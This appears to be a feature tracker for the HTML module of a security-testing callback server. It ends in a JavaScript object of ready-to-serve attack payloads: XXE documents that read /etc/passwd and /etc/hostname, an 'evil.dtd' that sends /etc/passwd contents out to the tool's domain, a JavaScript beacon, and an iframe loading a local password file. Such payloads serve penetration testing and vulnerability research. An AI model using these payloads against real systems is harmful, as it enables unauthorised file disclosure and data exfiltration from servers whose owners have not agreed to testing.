## HTML Module

### Progress Tracker

#### New Features - Response Formats

Support for HTTP request reflection in the following formats. Simply change the file extension in the request.

- [x] Plain Text (default, .txt)
- [x] HTML (.html, .html)
- [x] GIF (.gif)
- [x] JPEG (.jpg)
- [x] PNG (.png)
- [ ] MP4 (.mp4)
- [ ] XML (.xml)

#### New Features

- [ ] Let's Encrypt Auto Cert

#### Legacy Functionality

- [ ] robots.txt
- [ ] unfurly
- [ ] json
    - [ ] b64
- [ ] redirect
  - [ ] b64
- [ ] alert pattern with payload
- [ ] alert pattern
- [ ] slack hook
- [ ] basic auth
- [ ] breakfastbot
- [ ] allow origin *

#### Legacy Payloads


- [ ] sh
- [ ] dt
- [ ] evil.dtd
- [ ] ht
- [ ] sv
- [ ] logo

```js

const PAYLOADS = {
  'sh': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`
  },
  'dt': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://${DEFAULT_DOMAIN}/${ALERT_PATTERN}/xxe-test" >]><foo>&xxe;</foo>`,
  },
  'evil.dtd': {
    contentType: 'text/xml',
    content: `<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://${DEFAULT_DOMAIN}:80/${ALERT_PATTERN}/xxe?p=%payl;'>">`
  },
  'js': {
    contentType: 'text/javascript',
    content: `var s = document.createElement("img");document.body.appendChild(s); s.src="//${DEFAULT_DOMAIN}/${ALERT_PATTERN}/s";`
  },
  'ht': {
    contentType: 'text/html',
    content: `<html><body><img src="/${ALERT_PATTERN}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`
  },
  'sv': {
    contentType: 'image/svg+xml',
    content: `<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`
  },
  'logo': {
    contentType: 'image/svg+xml',
    content: LOGO_SVG
  }
}
```